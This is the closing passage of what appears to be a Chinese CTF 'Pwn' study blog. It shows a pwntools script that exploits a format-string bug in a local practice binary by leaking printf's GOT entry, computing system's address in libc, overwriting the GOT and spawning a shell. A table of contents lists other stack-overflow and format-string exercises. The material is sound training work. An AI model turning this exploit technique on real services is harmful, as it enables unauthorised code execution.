+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&#x27;./pwn&#x27;)</span><br><span class="line">elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line">libc = ELF(&#x27;./lib32/libc.so.6&#x27;)</span><br><span class="line">context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">printf_got = elf.got[&#x27;printf&#x27;]</span><br><span class="line">payload1 = p32(printf_got) + b&#x27;%6$s&#x27;</span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line">printf_addr = u32(p.recvuntil(b&#x27;\xf7&#x27;)[-4:])</span><br><span class="line">base_addr = printf_addr - libc.sym[&#x27;printf&#x27;]</span><br><span class="line">system_addr = base_addr + libc.sym[&#x27;system&#x27;]</span><br><span class="line"></span><br><span class="line">payload2 = fmtstr_payload(6,&#123;printf_got:system_addr&#125;)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+<hr>
+<h5 id="注释：这是作者学Pwn两个月来做到的一些感觉比较经典的题，还有很大部分没有记录，但是由于作者暂时不打算继续学Pwn，此系列无限期延更"><a href="#注释：这是作者学Pwn两个月来做到的一些感觉比较经典的题，还有很大部分没有记录，但是由于作者暂时不打算继续学Pwn，此系列无限期延更" class="headerlink" title="注释：这是作者学Pwn两个月来做到的一些感觉比较经典的题，还有很大部分没有记录，但是由于作者暂时不打算继续学Pwn，此系列无限期延更"></a>注释：这是作者学Pwn两个月来做到的一些感觉比较经典的题，还有很大部分没有记录，但是由于作者暂时不打算继续学Pwn，此系列无限期延更</h5></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://buchiyali.github.io">不吃压力</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://buchiyali.github.io/2026/10/31/pwn-study-log/">https://buchiyali.github.io/2026/10/31/pwn-study-log/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://buchiyali.github.io" target="_blank">Buchiyali's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Pwn/">Pwn</a><a class="post-meta__tags" href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/">栈溢出</a><a class="post-meta__tags" href="/tags/ret2libc/">ret2libc</a><a class="post-meta__tags" href="/tags/ret2syscall/">ret2syscall</a><a class="post-meta__tags" href="/tags/ret2shellcode/">ret2shellcode</a><a class="post-meta__tags" href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">格式化字符串</a><a class="post-meta__tags" href="/tags/CTF/">CTF</a></div><div class="post-share"><div class="social-share" data-image="/img/butterfly-icon.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">不吃压力</div><div class="author-info-description">一个网络安全爱好者</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E5%AE%B9%E7%B4%A2%E5%BC%95"><span class="toc-number">1.</span> <span class="toc-text">内容索引</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF"><span class="toc-number">2.</span> <span class="toc-text">学习路线</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA%EF%BC%9A%E4%BB%8E-ret2text-%E5%88%B0-ret2libc"><span class="toc-number">2.1.</span> <span class="toc-text">栈溢出：从 ret2text 到 ret2libc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PIE-%E4%B8%8E%E7%9C%9F%E5%AE%9E%E6%AF%94%E8%B5%9B%E9%A2%98"><span class="toc-number">2.2.</span> <span class="toc-text">PIE 与真实比赛题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">2.3.</span> <span class="toc-text">格式化字符串</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%BB%83%E4%B9%A0-%E4%B8%80%E4%B8%AA%E7%89%B9%E5%88%AB%E7%9A%84ret2text"><span class="toc-number">3.</span> <span class="toc-text">1. 栈溢出练习(一个特别的ret2text)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%BB%83%E4%B9%A0-ret2shellcode"><span class="toc-number">4.</span> <span class="toc-text">2. 栈溢出练习(ret2shellcode)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%BB%83%E4%B9%A0-ret2syscall"><span class="toc-number">5.</span> <span class="toc-text">3. 栈溢出练习(ret2syscall)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0-%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91%E4%B8%8B%E5%88%A9%E7%94%A8mprotect"><span class="toc-number">6.</span> <span class="toc-text">4. 栈溢出学习(静态编译下利用mprotect)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#mprotect%E5%87%BD%E6%95%B0"><span class="toc-number">6.1.</span> <span class="toc-text">mprotect函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#32%E4%BD%8D%E4%B8%8B%E7%9A%84mprotect%E5%88%A9%E7%94%A8"><span class="toc-number">6.2.</span> <span class="toc-text">32位下的mprotect利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#64%E4%BD%8D%E4%B8%8Bmprotect%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">6.3.</span> <span class="toc-text">64位下mprotect函数的利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%BB%83%E4%B9%A0-ret2libc-%EF%BC%88pwn4%EF%BC%89"><span class="toc-number">7.</span> <span class="toc-text">5. 栈溢出练习(ret2libc)（pwn4）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%BB%83%E4%B9%A0-ret2libc-%EF%BC%88ezrop64%EF%BC%89"><span class="toc-number">8.</span> <span class="toc-text">6. 栈溢出练习(ret2libc)（ezrop64）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%BB%83%E4%B9%A0-ret2libc2019CISCN"><span class="toc-number">9.</span> <span class="toc-text">7. 栈溢出练习(ret2libc2019CISCN)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-0xGame%E9%83%A8%E5%88%86Pwn%E9%A2%98%E9%A2%98%E8%A7%A3"><span class="toc-number">10.</span> <span class="toc-text">8. 0xGame部分Pwn题题解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%A6%E6%AD%A5%E4%BA%A6%E8%B6%8B-ret2text"><span class="toc-number">10.1.</span> <span class="toc-text">亦步亦趋(ret2text)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E6%89%87%E9%97%A8-ret2text"><span class="toc-number">10.2.</span> <span class="toc-text">三扇门(ret2text)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%A0%BC%E5%BC%8F%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-n%E5%86%99%E5%85%A5"><span class="toc-number">11.</span> <span class="toc-text">9. 字符串格式化漏洞学习(%n写入)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">11.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%981-fmtstr1"><span class="toc-number">11.2.</span> <span class="toc-text">例题1 fmtstr1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%83%E4%B9%A0-ctfshow"><span class="toc-number">11.3.</span> <span class="toc-text">练习 ctfshow</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%83%E4%B9%A0-printf%E7%9A%84%E5%8D%B1%E9%99%A9%E6%93%8D%E4%BD%9C"><span class="toc-number">11.4.</span> <span class="toc-text">练习 printf的危险操作</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10-%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%A0%BC%E5%BC%8F%E5%8C%96%E6%BC%8F%E6%B4%9E-getshell"><span class="toc-number">12.</span> <span class="toc-text">10. 字符串格式化漏洞(getshell)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ctfshow94%E9%A2%98"><span class="toc-number">12.1.</span> <span class="toc-text">ctfshow94题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ctfshow95%E9%A2%98"><span class="toc-number">12.2.</span> <span class="toc-text">ctfshow95题</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%A8%E9%87%8A%EF%BC%9A%E8%BF%99%E6%98%AF%E4%BD%9C%E8%80%85%E5%AD%A6Pwn%E4%B8%A4%E4%B8%AA%E6%9C%88%E6%9D%A5%E5%81%9A%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E6%84%9F%E8%A7%89%E6%AF%94%E8%BE%83%E7%BB%8F%E5%85%B8%E7%9A%84%E9%A2%98%EF%BC%8C%E8%BF%98%E6%9C%89%E5%BE%88%E5%A4%A7%E9%83%A8%E5%88%86%E6%B2%A1%E6%9C%89%E8%AE%B0%E5%BD%95%EF%BC%8C%E4%BD%86%E6%98%AF%E7%94%B1%E4%BA%8E%E4%BD%9C%E8%80%85%E6%9A%82%E6%97%B6%E4%B8%8D%E6%89%93%E7%AE%97%E7%BB%A7%E7%BB%AD%E5%AD%A6Pwn%EF%BC%8C%E6%AD%A4%E7%B3%BB%E5%88%97%E6%97%A0%E9%99%90%E6%9C%9F%E5%BB%B6%E6%9B%B4"><span class="toc-number">12.2.0.1.</span> <span class="toc-text">注释：这是作者学Pwn两个月来做到的一些感觉比较经典的题，还有很大部分没有记录，但是由于作者暂时不打算继续学Pwn，此系列无限期延更</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/10/31/pwn-study-log/" title="Pwn学习记录">Pwn学习记录</a><time datetime="2026-10-31T02:45:00.000Z" title="发表于 2026-10-31 10:45:00">2026-10-31</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By 不吃压力</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.7.0</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.7.0"></script><script src="/js/main.js?v=5.7.0"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
